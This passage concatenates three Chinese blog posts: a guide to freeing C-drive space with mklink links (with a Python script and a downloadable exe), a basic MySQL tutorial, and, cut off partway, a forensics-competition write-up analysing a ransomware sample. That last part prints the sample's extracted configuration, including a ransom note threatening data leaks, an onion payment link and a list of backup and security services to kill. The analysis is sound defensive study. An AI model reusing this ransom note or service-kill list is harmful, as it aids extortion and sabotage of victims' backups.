<p>清理一下爆满的C盘，其实也不是清理，就是数据转移</p>
<p><img src="/2024/10/01/cleanC/image-20241001142630593.png" alt="image-20241001142630593"></p>
<p>方法：使用mklink创建系统链接</p>
<span id="more"></span>

<h2 id="脚本实现"><a href="#脚本实现" class="headerlink" title="脚本实现"></a>脚本实现</h2><p>这么难得东西怎么能亲自动手呢？先写个脚本！ </p>
<div style="display:flex; justify-content: center; flex-direction: column; align-items: center">
    <text>脚本已制作成.exe，点击下方可下载。（本程序默认在D盘的AimportantDataLink文件夹下）</text>
    <br>
    <a href="https://creeeeeeeeeeper.github.io/2024/10/01/cleanC/目录迁移.exe" alt="目录迁移.exe"><div style="display: flex; flex-direction:row; border: solid 1px #cccccc; height: 60px;">
        <image src="https://creeeeeeeeeeper.github.io/2024/10/01/cleanC/bind.png" style="scale: 0.6; margin-top: 10px"></image>
        <div style="display: flex; flex-direction: column; font-size: 12.5px; padding-right: 15px; margin-top: 10px">
            <text>目录迁移.exe</text>
            <text style="font-size: 8px; color: #cccccc">11.1MB</text>
        </div>
    </div></a>
</div>


<div>
<div style="color: red; font-size: 18px">
（脚本需要在管理员权限下运行，否则无法创建链接）
</div>
<br>
<div style="color: green; font-size: 18px">
    &nbsp;&nbsp;&nbsp;>>>此脚本已验证可用<<<
</div>
</div>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line">original_catalogue_path = <span class="built_in">input</span>(<span class="string">&quot;需迁移目录路径: &quot;</span>)</span><br><span class="line">new_catalogue_path = <span class="string">&#x27;D:\\AimportantDataLink&#x27;</span> + <span class="string">&quot;\\&quot;</span> + original_catalogue_path.split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move_catalogue</span>(<span class="params">original_catalogue_path, new_catalogue_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(original_catalogue_path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;原目录不存在!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(new_catalogue_path):</span><br><span class="line">        os.makedirs(new_catalogue_path)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> os.listdir(original_catalogue_path):</span><br><span class="line">        original_item_path = os.path.join(original_catalogue_path, item)</span><br><span class="line">        new_item_path = os.path.join(new_catalogue_path, item)</span><br><span class="line">        shutil.move(original_item_path, new_item_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;已移动: <span class="subst">&#123;original_item_path&#125;</span> -&gt; <span class="subst">&#123;new_item_path&#125;</span>&quot;</span>)</span><br><span class="line">    link_name = new_catalogue_path</span><br><span class="line">    command = <span class="string">f&#x27;mklink &quot;<span class="subst">&#123;original_catalogue_path&#125;</span>&quot; &quot;<span class="subst">&#123;link_name&#125;</span>&quot;&#x27;</span></span><br><span class="line">    shutil.rmtree(original_catalogue_path)</span><br><span class="line">    os.system(command)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;已创建链接: <span class="subst">&#123;link_name&#125;</span> -&gt; <span class="subst">&#123;new_catalogue_path&#125;</span>&quot;</span>)</span><br><span class="line">move_catalogue(original_catalogue_path, new_catalogue_path)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>脚本中的<code>D:\\AimportantDataLink</code>为转移数据的存放路径，脚本看不懂继续往下看，看完就懂了</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>拿Edge浏览器开刀 &#x3D;&gt; <code>C:\Users\ &lt;your_user_name&gt; \AppData\Local\Microsoft\Edge</code></p>
<img src="/2024/10/01/cleanC/image-20241001142958389.png" alt="image-20241001142958389" style="zoom:50%;">

<p>Edge浏览器占了大概3.5G，给他移到D盘去</p>
<h3 id="关掉Edge所有进程"><a href="#关掉Edge所有进程" class="headerlink" title="关掉Edge所有进程"></a>关掉Edge所有进程</h3><h3 id="找到需要移动的数据"><a href="#找到需要移动的数据" class="headerlink" title="找到需要移动的数据"></a>找到需要移动的数据</h3><img src="/2024/10/01/cleanC/image-20241001143148530.png" alt="image-20241001143148530" style="zoom:50%;">

<p>结束进程后改成Edge_old，做个备份</p>
<img src="/2024/10/01/cleanC/image-20241001143247110.png" alt="image-20241001143247110" style="zoom:50%;">

<h3 id="在D盘创建存放数据的文件夹"><a href="#在D盘创建存放数据的文件夹" class="headerlink" title="在D盘创建存放数据的文件夹"></a>在D盘创建存放数据的文件夹</h3><p><img src="/2024/10/01/cleanC/image-20241001143402251.png" alt="image-20241001143402251"></p>
<p>我创建了一个<code>D:\AimportantDataLink\EdgeDataLink</code>的文件夹来存放Edge的数据</p>
<h3 id="数据迁移"><a href="#数据迁移" class="headerlink" title="数据迁移"></a>数据迁移</h3><p>进入Edge中把User Data复制到EdgeDataLink中</p>
<p><img src="/2024/10/01/cleanC/image-20241001143531046.png" alt="image-20241001143531046"></p>
<h3 id="创建链接-出现的问题及解决方法"><a href="#创建链接-出现的问题及解决方法" class="headerlink" title="创建链接 &amp; 出现的问题及解决方法"></a>创建链接 &amp; 出现的问题及解决方法</h3><p>使用管理员打开cmd</p>
<p>输入<code>mklink C:\Users\ &lt;your_user_name&gt; \AppData\Local\Microsoft\Edge D:\AimportantDataLink\EdgeDataLink</code></p>
<p>输出：</p>
<p><img src="/2024/10/01/cleanC/image-20241001143904591.png" alt="image-20241001143904591"></p>
<p>创建链接时如果出现 “当文件已存在时，无法创建该链接”</p>
<p><img src="/2024/10/01/cleanC/image-20241001143832466.png" alt="image-20241001143832466"></p>
<p>说明你可能在将Edge文件夹命名成Edge_old之后又打开了Edge，Edge自动创建了一个Edge文件夹，这时候直接结束Edge进程，然后把C盘中的Edge文件夹删掉就可以了，保证自己备份的Edge_old的数据有就行。</p>
<p>创建链接成功之后，Microsoft文件夹下出现了一个<code>.symlink</code>的文件：</p>
<p><img src="/2024/10/01/cleanC/image-20241001144335144.png" alt="image-20241001144335144"></p>
<p>确保这个Edge链接跟最开始的Edge文件夹在同一目录(Mirosoft)下，并与原来的Edge文件夹名称相同，迁移其他数据时也是这样</p>
<p>此时检查一下Microsoft目录下没有Edge文件夹这时候就可以打开Edge了</p>
<p>打开后看到自己的东西还在就放心了</p>
<p><img src="/2024/10/01/cleanC/image-20241001144556123.png" alt="image-20241001144556123"></p>
<h3 id="移除Edge-old"><a href="#移除Edge-old" class="headerlink" title="移除Edge_old"></a>移除Edge_old</h3><p>不放心的话，先把C盘Edge_old目录剪切到D盘，再次打开Edge，如果正常运行，并且自己的东西还在的话，就可以直接把所有Edge_old删除了。</p>
<p style="display: flex; justify-content: center; flex-direction: row; align-items: center">
<img src="/2024/10/01/cleanC/image-20241001144908565.png" alt="image-20241001144908565" style="zoom:50%;"> <text> => </text>  <img src="/2024/10/01/cleanC/image-20241001152447425.png" alt="image-20241001152447425" style="zoom:50%;">
</p>
（因为又清空了一下回收站，所以空间又多了好多）

<p>脚本如果用着不放心，就先在桌面上创个文件夹，里面放两个txt，用脚本跑一下，如果成功了，继续迁移C盘就可以了</p>
<div>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
</div>
]]></content>
  </entry>
  <entry>
    <title>数据库</title>
    <url>/2024/07/19/database/</url>
    <content><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><span id="more"></span>

<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>1.数据库</p>
<p>数据库就是用来存储各种数据的容器</p>
<p>2.数据库管理系统</p>
<p>专门用于创建和管理数据库的统一软件，介于应用和操作系统之间。比如MYSQL、SQL Server、Oracle等。他们不仅有基础的数据管理功能，还能保证数据的完整性、安全性和可靠性</p>
<p>3.数据库应用程序</p>
<p>通过数据库管理系统提供的接口与之通信、访问和管理数据的应用程序</p>
<p>4.SQL语言</p>
<p>它是一种数据库查询语言和程序设计语言，主要用于管理数据库中的数据，如存储数据、查询数据、更新数据</p>
<h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>MYSQL<a href="https://dev.mysql.com/downloads/mysql/">下载链接</a></p>
<p>历史版本<a href="https://download.mysql.com/archives">下载链接</a>，选择MySQL Community Server</p>
<p>下载使用5.0的最高版本5.0.96</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>启动服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure>

<p>关闭服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">net stop mysql</span><br></pre></td></tr></table></figure>

<p>登录：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u root -p</span><br></pre></td></tr></table></figure>

<p>登录也可以直接打开MySQL Command Line Client</p>
<p><img src="/2024/07/19/database/image-20240719221312406.png" alt="image-20240719221312406"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; help</span><br><span class="line"></span><br><span class="line">For information about MySQL products and services, visit:</span><br><span class="line">   http://www.mysql.com/</span><br><span class="line">For developer information, including the MySQL Reference Manual, visit:</span><br><span class="line">   http://dev.mysql.com/</span><br><span class="line">To buy MySQL Enterprise support, training, or other products, visit:</span><br><span class="line">   https://shop.mysql.com/</span><br><span class="line"></span><br><span class="line">List of all MySQL commands:</span><br><span class="line">Note that all text commands must be first on line and end with &#x27;;&#x27;</span><br><span class="line">?         (\?) Synonym for `help&#x27;.</span><br><span class="line">clear     (\c) Clear the current input statement.</span><br><span class="line">connect   (\r) Reconnect to the server. Optional arguments are db and host.</span><br><span class="line">delimiter (\d) Set statement delimiter.</span><br><span class="line">ego       (\G) Send command to mysql server, display result vertically.</span><br><span class="line">exit      (\q) Exit mysql. Same as quit.</span><br><span class="line">go        (\g) Send command to mysql server.</span><br><span class="line">help      (\h) Display this help.</span><br><span class="line">notee     (\t) Don&#x27;t write into outfile.</span><br><span class="line">print     (\p) Print current command.</span><br><span class="line">prompt    (\R) Change your mysql prompt.</span><br><span class="line">quit      (\q) Quit mysql.</span><br><span class="line">rehash    (\#) Rebuild completion hash.</span><br><span class="line">source    (\.) Execute an SQL script file. Takes a file name as an argument.</span><br><span class="line">status    (\s) Get status information from the server.</span><br><span class="line">tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.</span><br><span class="line">use       (\u) Use another database. Takes database name as argument.</span><br><span class="line">charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.</span><br><span class="line">warnings  (\W) Show warnings after every statement.</span><br><span class="line">nowarning (\w) Don&#x27;t show warnings after every statement.</span><br><span class="line"></span><br><span class="line">For server side help, type &#x27;help contents&#x27;</span><br></pre></td></tr></table></figure>

<p>查询当前有哪些数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/19/database/image-20241217170658744.png" alt="image-20241217170658744"></p>
<h2 id="数据库和表操作"><a href="#数据库和表操作" class="headerlink" title="数据库和表操作"></a>数据库和表操作</h2><p>通过 <code>show databases;</code> 可以查看到所有有的数据库，一个数据库对应的就是一个文件夹</p>
<p><img src="/2024/07/19/database/image-20241217171020105.png" alt="image-20241217171020105"></p>
<p>选择一个数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use mysql;</span><br></pre></td></tr></table></figure>

<h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>1.查看全部数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p>2.创建数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database 数据库名</span><br></pre></td></tr></table></figure>

<p>3.查询创建好的数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show create database 数据库名</span><br></pre></td></tr></table></figure>

<p>4.修改数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter database 数据库名 default character set 编码方式 collate 编码方式_bin</span><br></pre></td></tr></table></figure>

<p>如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter database abcabc default character set gbk collate gbk_bin</span><br></pre></td></tr></table></figure>

<p>5.删除数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop database 数据库名</span><br></pre></td></tr></table></figure>

<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>数字类型</p>
<table>
<thead>
<tr>
<th align="center">数据类型</th>
<th align="center">字节数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">TINYINT</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">SMALLINT</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">MEDIUMINT</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">INT</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">BIGINT</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">FLOAT</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">DOUBLE</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">DECIMAL(M, D)</td>
<td align="center">M+2</td>
</tr>
</tbody></table>
<p>日期类型</p>
<table>
<thead>
<tr>
<th align="center">数据类型</th>
<th align="center">字节数</th>
<th align="center">日期格式</th>
<th align="center">取值范围</th>
</tr>
</thead>
<tbody><tr>
<td align="center">YEAR</td>
<td align="center">1</td>
<td align="center">YYYY</td>
<td align="center">1901~2155</td>
</tr>
<tr>
<td align="center">DATE</td>
<td align="center">4</td>
<td align="center">YYYY-MM-DD</td>
<td align="center">1000-01-01<del>9999</del>12-03</td>
</tr>
<tr>
<td align="center">TIME</td>
<td align="center">3</td>
<td align="center">HH:MM:SS</td>
<td align="center">-838:59:59~838:59:59</td>
</tr>
<tr>
<td align="center">DATETIME</td>
<td align="center">8</td>
<td align="center">YYYY-MM-DD HH:MM:SS</td>
<td align="center">1000-01-01 00:00:00 ~ 9999-12-31 23:59:59</td>
</tr>
<tr>
<td align="center">TIMESTAMP</td>
<td align="center">4</td>
<td align="center">YYYY-MM-DD HH:MM:SS</td>
<td align="center">1970-01-01 00:00:01 ~ 2038-01-19 03:14:07</td>
</tr>
</tbody></table>
<p>字符串和文本类型</p>
<table>
<thead>
<tr>
<th align="center">数据类型</th>
<th align="center">字节数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CHAR</td>
<td align="center">用于表示固定长度的字符串，char(4)，一直占用4个字节</td>
</tr>
<tr>
<td align="center">VARCHAR</td>
<td align="center">用于表示可变长度的字符串，比如<code>&quot;a&quot;</code>占1+1&#x3D;2个字节，<code>&quot;aa&quot;</code>占用2+1&#x3D;3个字节</td>
</tr>
<tr>
<td align="center">BINARY</td>
<td align="center">用于表示固定长度的二进制长度</td>
</tr>
<tr>
<td align="center">VARBINARY</td>
<td align="center">用于表示可变长度的二进制长度</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">TINYTEXT</td>
<td align="center">0~255字节</td>
</tr>
<tr>
<td align="center">TEXT</td>
<td align="center">0~65535</td>
</tr>
<tr>
<td align="center">MEDIUMTEXT</td>
<td align="center">0~16777215字节</td>
</tr>
<tr>
<td align="center">LONGTEXT</td>
<td align="center">0~4294967295字节</td>
</tr>
</tbody></table>
<h3 id="数据库表的操作"><a href="#数据库表的操作" class="headerlink" title="数据库表的操作"></a>数据库表的操作</h3><p>1.创建数据表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table 表名;</span><br></pre></td></tr></table></figure>

<p>2.查询当前数据库所有表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>

<p>3.查看数据表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show create table 表名;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">desc 表名;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/19/database/image-20241217173806616.png" alt="image-20241217173806616"></p>
<p>4.修改表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 修改表名</span><br><span class="line">alter table 旧表名 rename 新表名;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/19/database/image-20241217174209933.png" alt="image-20241217174209933"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 修改字段名的属性</span><br><span class="line">alter table 表名 modify 字段名 数据类型;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/19/database/image-20241217174408895.png" alt="image-20241217174408895"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 修改字段名</span><br><span class="line">alter table userinfo change id userid int(6);</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/19/database/image-20241217174607451.png" alt="image-20241217174607451"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 新增字段</span><br><span class="line">alter table userinfo add newinfo int(8);</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/19/database/image-20241217174731199.png" alt="image-20241217174731199"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 删除字段</span><br><span class="line">alter table userinfo drop newinfo;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/19/database/image-20241217174823026.png" alt="image-20241217174823026"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 删除表</span><br><span class="line">drop table 表名;</span><br></pre></td></tr></table></figure>

<h2 id="添加、更新和删除数据"><a href="#添加、更新和删除数据" class="headerlink" title="添加、更新和删除数据"></a>添加、更新和删除数据</h2><p>对于int类型数据，数据类型有zerofill属性和没有zerofill属性的区别：</p>
<p><img src="/2024/07/19/database/image-20241217195621319.png" alt="image-20241217195621319"></p>
<h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><p>查看表中的数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名</span><br></pre></td></tr></table></figure>

<h3 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h3><p><strong>向表中添加数据（使用字段名）：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into 表名 (id, name, StudentNumber) values(1, &quot;Gianluca Zeong&quot;, 20231084);</span><br></pre></td></tr></table></figure>

<p>如上面这一条插入语句，如果name的字符数超过了定义的属性varchar(8)，那么就会截断8个字符。</p>
<p>可以再使用alter把type改的大一点</p>
<p><strong>向表中添加数据（使用不全字段名）：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into 表名 (id, StudentNumber) values(1, 20233033);</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/19/database/image-20241217200408971.png" alt="image-20241217200408971"></p>
<p>没有给值的name字段因为本来是varchar类型，所以会显示NULL</p>
<p><strong>向表中添加数据（不使用字段）：</strong></p>
<p>只写values的时候需要与字段顺序和类型完全对应：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into userinfo values(3, &quot;goblin&quot;, 20231111);</span><br></pre></td></tr></table></figure>

<p><strong>添加多行数据：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into userinfo values(4, &quot;444&quot;, 44444444), (5, &quot;555&quot;, 55555555);</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/19/database/image-20241217203148102.png" alt="image-20241217203148102"></p>
<p>前面在id&#x3D;1和3之间删了一条2，现在插入多条时，第一条会插入到之前删掉的那一条的位置</p>
<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update 表名 set 字段名 = 值</span><br></pre></td></tr></table></figure>

<p>上面这个语句会将表中所有的 <code>字段名</code> 改成 <code>值</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update 表名 set 字段名 = 值 where 条件</span><br></pre></td></tr></table></figure>

<p>上面这个语句会将所有匹配where条件的数据的 <code>字段名</code> 改为 <code>值</code>。</p>
<p><img src="/2024/07/19/database/image-20241217201512953.png" alt="image-20241217201512953"></p>
<h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from 表名 where 条件;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/19/database/image-20241217202748820.png" alt="image-20241217202748820"></p>
<h2 id="单表查询"><a href="#单表查询" class="headerlink" title="单表查询"></a>单表查询</h2><p>查看表的数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名;</span><br></pre></td></tr></table></figure>

<p>条件查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where 条件表达式</span><br></pre></td></tr></table></figure>

<p>where联合</p>
<p><img src="/2024/07/19/database/image-20241217204306484.png" alt="image-20241217204306484"></p>
<p>聚合查询：</p>
<p>Count() sun() avg()</p>
]]></content>
  </entry>
  <entry>
    <title>cvz8n37 exe分析</title>
    <url>/2025/04/17/cvz8n37/</url>
    <content><![CDATA[<p>2024数证杯团体赛决赛，exe分析</p>
<span id="more"></span>



<h2 id="1-通过分析恶意程序，找出运行该软件必要的参数是？（答案格式：–xxx-xxx）-2-0分"><a href="#1-通过分析恶意程序，找出运行该软件必要的参数是？（答案格式：–xxx-xxx）-2-0分" class="headerlink" title="1.通过分析恶意程序，找出运行该软件必要的参数是？（答案格式：–xxx-xxx） (2.0分)"></a>1.通过分析恶意程序，找出运行该软件必要的参数是？（答案格式：–xxx-xxx） (2.0分)</h2><p>程序我改了一下名字，<code>cc.exe</code></p>
<img src="/2025/04/17/cvz8n37/image-20250417191808115.png" alt="image-20250417191808115" style="zoom:70%;">

<blockquote>
<p>–access-token</p>
</blockquote>
<h2 id="2-该程序为了控制控制最大并发数，在注册表中设置了MaxMpxCt参数，请给出设置参数的具体值。（答案格式：纯数字）-2-0分"><a href="#2-该程序为了控制控制最大并发数，在注册表中设置了MaxMpxCt参数，请给出设置参数的具体值。（答案格式：纯数字）-2-0分" class="headerlink" title="2.该程序为了控制控制最大并发数，在注册表中设置了MaxMpxCt参数，请给出设置参数的具体值。（答案格式：纯数字） (2.0分)"></a>2.该程序为了控制控制最大并发数，在注册表中设置了MaxMpxCt参数，请给出设置参数的具体值。（答案格式：纯数字） (2.0分)</h2><p>先直接搜一下这个东西 <code>MaxMpxCt</code></p>
<p><img src="/2025/04/17/cvz8n37/image-20250417191933643.png" alt="image-20250417191933643"></p>
<p><img src="/2025/04/17/cvz8n37/image-20250417192013936.png" alt="image-20250417192013936"></p>
<blockquote>
<p>65533</p>
</blockquote>
<h2 id="3-该程序运行过程中会创建新的分区磁盘，请写出该分区磁盘一级目录中的文件名。（答案格式：如有字母请大写）-2-0分"><a href="#3-该程序运行过程中会创建新的分区磁盘，请写出该分区磁盘一级目录中的文件名。（答案格式：如有字母请大写）-2-0分" class="headerlink" title="3.该程序运行过程中会创建新的分区磁盘，请写出该分区磁盘一级目录中的文件名。（答案格式：如有字母请大写） (2.0分)"></a>3.该程序运行过程中会创建新的分区磁盘，请写出该分区磁盘一级目录中的文件名。（答案格式：如有字母请大写） (2.0分)</h2><p>在搜索的时候发现了一大串字符串，仔细看看是一串json文本，拿出来看一下</p>
<details>
    <summary>dump.json</summary>
    <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;config_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;public_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMII; DATA XREF: sub_47DF80+25F↑oBCgKCAQEA4gnBZNNkKwmyzzwdmEHPuAYLLVseu+L3XEKgHhvKvwROTqkBYCE9ZND9I5oBwfCciCa32+FvBXHTVbY9TkTWmMYtgyDMrd3leo9oA8Mt+07jNK+O6ULFRvw+lZAakjkbiWLLBL24kgBWzYJk2brrrAoEx0/Xldp8uOJOUPrc2rpcJqkczeKpw4Qc8q6NKJ/ArEYXdRwbuUq+xkQGZ10bGHbXnI4dGvue1pscK1qXB5f+YDTwBC1/sN0J/LKNWaAQZuZDsGBdsYTw67DhfPrXD5FXy4e5a8pLwxVyLPgP0qjRvedn/GvX8NNdIFrFNuY+n2B5fHOPscbNmSXs4kw/NwIDAQAB&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;extension&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cvz8n37&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;note_file_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RECOVER-$&#123;EXTENSION&#125;-FILES.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;note_full_text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;&gt; What happened?\n\nImportant files on your network was ENCRYPTED and now they have \&quot;$&#123;EXTENSION&#125;\&quot; extension.\nIn order to recover your files you need to follow instructions below.\n\n&gt;&gt; Sensitive Data\n\nSensitive data on your network was DOWNLOADED.\nIf you DON7h,&#x27;T WANT your sensitive data to be PUBLISHED you have to act quickly.\n\nData includes:\n- Employees personal data, CVs, DL, SSN.\n- Complete network map including credentials for local and remote services.\n- Private financial information including: clients data, bills, budgets, annual reports, bank statements.\n- Manufacturing documents including: datagrams, schemas, drawings in solidworks format\n- And more...\n\n&gt;&gt; CAUTION\n\nDO NOT MODIFY ENCRYPTED FILES YOURSELF.\nDO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.\nYOU MAY DAMAGE YOUR FILES, IT WILL RESULT IN PERMANENT DATA LOSS.\n\n&gt;&gt; What should I do next?\n\n1) Download and install Tor Browser from: https://torproject.org/\n2) Navigate to: http://gbxbwicx3x35kn7n73opnpp4kkzjcra42iv2akoo2dcjinf6jf6qbuyd.onion/?access-key=$&#123;ACCESS_KEY&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;note_short_text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important files on your network was DOWNLOADED and ENCRYPTED.\nSee \&quot;$&#123;NOTE_FILE_NAME&#125;\&quot; file to get further instructions.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;default_file_mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Auto&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;default_file_cipher&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Best&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;credentials&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;kill_services&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;mepocs&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;memtas&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;veeam&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;svc$&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;backup&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sql&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;vss&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;msexchange&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sql$&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;mysql&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;mysql$&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sophos&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;MSExchange&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;MSExchange$&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;WSBExchange&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;PDVFSService&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;BackupExecVSSProvider&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;BackupExecAgentAccelerator&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;BackupExecAgentBrowser&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;BackupExecDiveciMediaService&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;BackupExecJobEngine&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;BackupExecManagementService&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;BackupExecRPCService&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;GxBlr&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;GxVss&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;GxClMgrS&quot;</span><span 